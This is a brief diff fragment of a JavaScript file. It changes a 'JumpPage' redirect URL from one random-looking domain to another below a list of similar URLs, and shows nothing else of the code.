@@ -42,7 +42,7 @@ var urls=[
     'mlmwaleoe.cc/',
 ];                                                                                                                  
 
-var JumpPage="https://kxfgfqzu.com";
+var JumpPage="https://uodrneac.cc";
 
 var newestUrls = [];
 
